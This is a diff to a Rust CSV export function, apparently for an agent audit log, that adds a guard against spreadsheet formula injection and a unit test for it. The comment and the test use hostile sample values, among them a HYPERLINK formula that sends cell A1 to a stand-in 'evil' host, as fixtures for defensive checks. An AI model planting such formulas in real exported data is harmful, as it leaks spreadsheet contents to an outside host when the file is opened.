@@ -335,10 +335,29 @@ async fn purge(
 
 fn row_to_csv_line(r: &ListRow) -> String {
     fn esc(s: &str) -> String {
-        if s.contains(',') || s.contains('"') || s.contains('\n') {
-            format!("\"{}\"", s.replace('"', "\"\""))
+        // Defend two distinct threats:
+        //  1. CSV *structure* — quote + double any field containing the
+        //     separator / quote / newline (RFC 4180).
+        //  2. Spreadsheet *formula* injection (CWE-1236) — a field whose first
+        //     character is `=`, `+`, `-`, `@`, or a leading tab/CR is evaluated
+        //     as a formula by Excel / Google Sheets / LibreOffice on open. The
+        //     exported columns include attacker-influenced values (the agent's
+        //     request `path`, `action`, `vendor`, `p_0`), and the export is the
+        //     documented SIEM-backfill surface that gets opened in a sheet, so
+        //     a row like `path=/drive/v3/files/=HYPERLINK("http://evil",…)`
+        //     would fire on open. Prefix a single quote (the OWASP-recommended
+        //     defang) so the cell renders as literal text, and force-quote so
+        //     the leading `'` survives a CSV re-parse.
+        let needs_formula_guard = s.starts_with(['=', '+', '-', '@', '\t', '\r']);
+        let body = if needs_formula_guard {
+            format!("'{s}")
         } else {
             s.to_string()
+        };
+        if needs_formula_guard || body.contains(',') || body.contains('"') || body.contains('\n') {
+            format!("\"{}\"", body.replace('"', "\"\""))
+        } else {
+            body
         }
     }
     format!(
@@ -687,6 +706,30 @@ mod tests {
         assert!(line.contains("drive.files.get"));
         assert!(line.contains("drive-injection-filter"));
         assert!(line.contains("2026-05-14T00:00:00"));
+    }
+
+    #[test]
+    fn row_to_csv_line_defangs_spreadsheet_formula_injection() {
+        // CWE-1236: attacker-influenced fields starting with a formula trigger
+        // must be neutralized (leading `'`, force-quoted) so a CSV opened in a
+        // spreadsheet doesn't evaluate them.
+        let mut r = sample_row();
+        r.path = "=HYPERLINK(\"http://evil/?x=\"&A1,\"go\")".into();
+        r.p_0 = "@SUM(1+1)".into();
+        r.action = "-2+3".into();
+        r.vendor = "+ping".into();
+        let line = row_to_csv_line(&r);
+        // Each dangerous field is prefixed with `'` and wrapped in quotes; the
+        // inner `"` are doubled per RFC 4180.
+        assert!(line.contains("\"'=HYPERLINK(\"\"http://evil/?x=\"\"&A1,\"\"go\"\")\""));
+        assert!(line.contains("\"'@SUM(1+1)\""));
+        assert!(line.contains("\"'-2+3\""));
+        assert!(line.contains("\"'+ping\""));
+        // A benign value is untouched (no spurious quoting/prefix).
+        assert!(line.contains(",200,"));
+        let benign = row_to_csv_line(&sample_row());
+        assert!(benign.contains("google"));
+        assert!(!benign.contains("'google"));
     }
 
     #[test]
